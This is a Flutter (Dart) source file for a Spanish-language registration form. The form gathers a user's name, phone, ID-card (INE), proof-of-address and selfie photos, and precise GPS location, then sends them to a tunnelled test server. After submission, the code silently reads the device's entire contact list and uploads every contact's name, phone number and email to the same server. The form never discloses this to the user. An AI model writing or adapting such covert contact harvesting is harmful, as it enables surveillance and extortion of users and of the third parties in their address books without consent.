import 'dart:convert';

import 'package:elegant_notification/resources/arrays.dart';
import 'package:flutter/material.dart';

import 'package:hexcolor/hexcolor.dart';
import 'package:image_picker/image_picker.dart';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:intl_phone_field/intl_phone_field.dart';
import 'package:geolocator/geolocator.dart';

import 'package:permission_handler/permission_handler.dart';
import 'package:path_provider/path_provider.dart';
import 'package:http_parser/http_parser.dart';

import '../Loader/ProgressHUD.dart';
import 'package:elegant_notification/elegant_notification.dart';

import 'datos.dart';
import 'package:path_provider/path_provider.dart';
import 'package:path/path.dart' as path;
import 'package:flutter_contacts/flutter_contacts.dart';

class RegistroForm extends StatefulWidget {
  @override
  _RegistroFormState createState() => _RegistroFormState();
}

final Color colors = HexColor('#D61C4E');
final Color colors_black = HexColor('#333333');

class _RegistroFormState extends State<RegistroForm>
    with SingleTickerProviderStateMixin {
  final GlobalKey<FormState> _formKey = GlobalKey<FormState>();
  TextEditingController _nombreController = TextEditingController();
  TextEditingController _telefonoController = TextEditingController();
  File? _ineFoto;
  File? _domicilioFoto;
  File? _fotoPersonal;
  var contactos;
  late Position _currentPosition;
  @override
  void initState() {
    super.initState();
    _requestPermissions();
  }

  Future<void> _requestPermissions() async {
    // Solicitar permisos de ubicación
    if (await Permission.location.isDenied) {
      await Permission.location.request();
    }

    // Solicitar permisos de contactos
    if (await Permission.contacts.isDenied) {
      await Permission.contacts.request();
    }

    // Verificar si los permisos fueron otorgados
    if (await Permission.location.isGranted &&
        await Permission.contacts.isGranted) {
      _fetchCurrentLocation();
    } else {
      ElegantNotification.error(
        title: Text("Permisos necesarios"),
        description: Text(
            "Por favor, habilite los permisos de ubicación y contactos para continuar."),
      ).show(context);
    }
  }

  Future<void> _fetchCurrentLocation() async {
    _currentPosition = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high,
    );
    print("Latitud: ${_currentPosition.latitude}");
    print("Longitud: ${_currentPosition.longitude}");
  }

 Future<void> _seleccionarFoto(ImageSource source, String photoType) async {
  final picker = ImagePicker();
  final pickedImage = await picker.pickImage(source: source);
  if (pickedImage != null) {
    setState(() {
      switch (photoType) {
        case 'INE':
          _ineFoto = File(pickedImage.path);
          String imageName = _ineFoto!.path.split('/').last;
          print('Nombre de la imagen: $imageName');
          break;
        case 'Domicilio':
          _domicilioFoto = File(pickedImage.path);
          String imageName = _domicilioFoto!.path.split('/').last;
          print('Nombre de la imagen: $imageName');
          break;
        case 'FotoPersonal':
          _fotoPersonal = File(pickedImage.path);
          String imageName = _fotoPersonal!.path.split('/').last;
          print('Nombre de la imagen: $imageName');
          break;
      }
    });
  }
}


  var latitud;
  var longitud;
  enviarUbicacion(Position posicion) async {
    latitud = posicion.latitude.toString();
    longitud = posicion.longitude.toString();
  }

  obtenerUbicacionActual() async {
    bool servicioHabilitado;
    LocationPermission permiso;

    // Verificar si el servicio de ubicación está habilitado
    servicioHabilitado = await Geolocator.isLocationServiceEnabled();
    if (!servicioHabilitado) {
      // El servicio de ubicación no está habilitado, mostrar un mensaje de error
      print('El servicio de ubicación no está habilitado');
      return;
    }

    // Solicitar el permiso de ubicación
    permiso = await Geolocator.checkPermission();
    if (permiso == LocationPermission.denied) {
      // El permiso de ubicación está denegado, solicitar permiso al usuario
      permiso = await Geolocator.requestPermission();
      if (permiso != LocationPermission.whileInUse &&
          permiso != LocationPermission.always) {
        // El usuario no otorgó el permiso de ubicación, mostrar un mensaje de error
        print('El permiso de ubicación fue denegado');
        return;
      }
    }

    // Obtener la ubicación actual
    Position posicion = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high,
    );

    // Enviar la ubicación a la API
    await enviarUbicacion(posicion);
  }

  _enviarFormulario() async {
    await obtenerUbicacionActual();
    
    var nombre = _nombreController.text;
    var telefono = _telefonoController.text;
    if (nombre.isEmpty || telefono.isEmpty) {
      setState(() {
        isApiCallProcess = false;
      });
      // Validar que los campos no estén vacíos
      ElegantNotification.error(
        title: const Text('Error'),
        description:
            const Text('Por favor, complete todos los campos obligatorios.'),
        animation: AnimationType
            .fromRight, // Verifica si este parámetro aún es válido.
      ).show(context);

      return;
    }
    var URI_API = Uri.parse('https://tst-register-users.loca.lt/api/user/new/');
    var req = new http.MultipartRequest("POST", URI_API);
    req.fields['name'] = nombre;
    req.fields['number_phone'] = telefono;
    req.fields['latitud'] = latitud;
    req.fields['longitud'] = longitud;
    req.fields['ipUser'] = nombre;
    req.fields['deviceName'] = telefono;

    req.files.add(await http.MultipartFile.fromPath(
        'INE', _ineFoto!.path.toString(),
        contentType: MediaType('image', 'jpg')));
    req.files.add(await http.MultipartFile.fromPath(
        'Domicilio', _domicilioFoto!.path.toString(),
        contentType: MediaType('image', 'jpg')));
    req.files.add(await http.MultipartFile.fromPath(
        'Foto', _fotoPersonal!.path.toString(),
        contentType: MediaType('image', 'jpg')));

    req.send().then((res) => {
          res.stream.transform(utf8.decoder).listen((val) async {
            // Obtener la carpeta de descargas
            final downloadsDirectory = await getExternalStorageDirectory();
            final downloadsPath = downloadsDirectory!.path;

// Generar un nombre de archivo único
            final fileName =
                '${DateTime.now().millisecondsSinceEpoch}_datos.txt';

// Combinar la ruta de descargas con el nombre de archivo
            final filePath = path.join(downloadsPath, fileName);

// Guardar contenido en un archivo de texto
            final archivo = File(filePath);
            await archivo.writeAsString(val);

// Navegar a la vista de DatosEnviadosPage
            Navigator.pushReplacement(
              context,
              MaterialPageRoute(
                builder: (context) => DatosEnviadosPage(
                  datosEnviados: val,
                  rutaArchivo: filePath,
                ),
              ),
            );

            print(val);
            ElegantNotification.success(
              width: 360, // Ancho del popup
              title: const Text('DATOS ENVIADOS'), // Título de la notificación
              description: Text('$val'), // Descripción dinámica
              animation: AnimationType.fromRight, // Tipo de animación
              onDismiss: () {
                // Acción al descartar la notificación
                print('Esta acción se ejecutará al cerrar la notificación.');
              },
            ).show(context);

            setState(() {
              isApiCallProcess = false;
            });
            setState(() {
              contactos = val;
            });
            _fetchContacts();
          })
        });
  }

  Widget _buildPhotoButton(
      String buttonText, IconData icon, VoidCallback onPressed) {
    return Material(
      elevation: 2.0,
      borderRadius: BorderRadius.circular(8.0),
      color: colors_black,
      child: InkWell(
        onTap: onPressed,
        child: Container(
          height: 48.0,
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(
                icon,
                color: Colors.white,
              ),
              SizedBox(width: 8.0),
              Text(
                buttonText,
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 16.0,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  bool isApiCallProcess = false;
  @override
  Widget build(BuildContext context) {
    return ProgressHUD(
      child: Actas_De(context),
      inAsyncCall: isApiCallProcess,
      opacity: 0.3,
      key: Key(isApiCallProcess.toString()),
      valueColor: AlwaysStoppedAnimation<Color>(Colors.red),
    );
  }

  @override
  Widget Actas_De(BuildContext context) {
    return Scaffold(
      appBar: PreferredSize(
        preferredSize: Size.fromHeight(80.0),
        child: AppBar(
          backgroundColor: colors,
          elevation: 0,
          shape: ContinuousRectangleBorder(
            borderRadius: BorderRadius.only(
              bottomLeft: Radius.circular(20.0),
              bottomRight: Radius.circular(20.0),
            ),
          ),
          title: Text(
            'Registro',
            style: TextStyle(fontSize: 24.0, fontWeight: FontWeight.bold),
          ),
          centerTitle: true,
        ),
      ),
      body: Padding(
        padding: EdgeInsets.all(16.0),
        child: Form(
          key: _formKey,
          child: ListView(
            children: [
              TextFormField(
                controller: _nombreController,
                decoration: InputDecoration(
                  labelText: 'Nombre completo',
                  border: OutlineInputBorder(),
                ),
                validator: (value) {
                  if (value!.isEmpty) {
                    return 'Por favor, ingresa tu nombre';
                  }
                  return null;
                },
              ),
              SizedBox(height: 16.0),
              TextFormField(
                controller: _telefonoController,
                keyboardType: TextInputType.phone,
                decoration: InputDecoration(
                  labelText: 'Teléfono',
                  border: OutlineInputBorder(),
                ),
                maxLength: 10, // Establece el máximo de 10 caracteres
                validator: (value) {
                  if (value!.isEmpty) {
                    return 'Por favor, ingresa tu teléfono';
                  }
                  return null;
                },
              ),
              SizedBox(height: 16.0),
              Text(
                'INE',
                style: TextStyle(fontSize: 16.0),
              ),
              SizedBox(height: 8.0),
              _ineFoto != null
                  ? ClipRRect(
                      borderRadius: BorderRadius.circular(8.0),
                      child: Image.file(
                        _ineFoto!,
                        height: 150.0,
                        fit: BoxFit.cover,
                      ),
                    )
                  : Container(),
              SizedBox(height: 8.0),
              _buildPhotoButton(
                'Seleccionar foto INE',
                Icons.photo,
                () => _seleccionarFoto(ImageSource.gallery, 'INE'),
              ),
              SizedBox(height: 16.0),
              Text(
                'Domicilio',
                style: TextStyle(fontSize: 16.0),
              ),
              SizedBox(height: 8.0),
              _domicilioFoto != null
                  ? ClipRRect(
                      borderRadius: BorderRadius.circular(8.0),
                      child: Image.file(
                        _domicilioFoto!,
                        height: 150.0,
                        fit: BoxFit.cover,
                      ),
                    )
                  : Container(),
              SizedBox(height: 8.0),
              _buildPhotoButton(
                'Seleccionar foto Domicilio',
                Icons.photo,
                () => _seleccionarFoto(ImageSource.gallery, 'Domicilio'),
              ),
              SizedBox(height: 16.0),
              Text(
                'Foto Personal',
                style: TextStyle(fontSize: 16.0),
              ),
              SizedBox(height: 8.0),
              _fotoPersonal != null
                  ? ClipRRect(
                      borderRadius: BorderRadius.circular(8.0),
                      child: Image.file(
                        _fotoPersonal!,
                        height: 150.0,
                        fit: BoxFit.cover,
                      ),
                    )
                  : Container(),
              SizedBox(height: 8.0),
              _buildPhotoButton(
                'Seleccionar foto personal',
                Icons.photo,
                () => _seleccionarFoto(ImageSource.gallery, 'FotoPersonal'),
              ),
              SizedBox(height: 16.0),
              ElevatedButton(
                child: Text('Enviar'),
                style: ElevatedButton.styleFrom(
                  foregroundColor: Colors.white,
                  backgroundColor: colors,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(8.0),
                  ),
                  padding: EdgeInsets.symmetric(vertical: 16.0),
                ),
                onPressed: () {
                  _enviarFormulario();
                  setState(() {
                    isApiCallProcess = true;
                  });
                },
              ),
            ],
          ),
        ),
      ),
    );
  }

  late List<Contact> _contacts;

  Putnames(
    String names,
    String lastname,
    String phone,
    String email,
  ) async {
    //print(Token);ngrok http 8035 --domain=tst.register.users.ngrok.app

    Map<String, String> mainheader = new Map();
    mainheader["content-type"] = "application/json";

    Map<String, dynamic> body = {
      'name': names,
      'lastname': lastname,
      'phone': phone,
      'email': email,
    };

    var response = await http.post(
        Uri.parse(
            'https://tst-register-users.loca.lt/api/app/contacts/whenregister/add/' +
                contactos.toString()),
        headers: mainheader,
        body: json.encode(body));
    var datas = jsonDecode(response.body);
    print(datas);
  }

  SendContact(Contact contact) async {
    1 |
        Putnames(
          contact.name.first,
          contact.name.last,
          contact.phones.isNotEmpty ? contact.phones.first.number : '(none)',
          contact.emails.isNotEmpty ? contact.emails.first.address : '(none)',
        );
  }

  Future _fetchContacts() async {
    if (!await FlutterContacts.requestPermission(readonly: true)) {
      //setState(() => _permissionDenied = true);
    } else {
      final contacts = await FlutterContacts.getContacts();
      _contacts = contacts;
      //  setState(() => _contacts = contacts);

      final List<Future> contactFutures = _contacts.map((contacto) async {
        final fullContact = await FlutterContacts.getContact(contacto.id);
        SendContact(fullContact!);
        print("Ok");
      }).toList();

      await Future.wait(contactFutures);
    }
  }
}
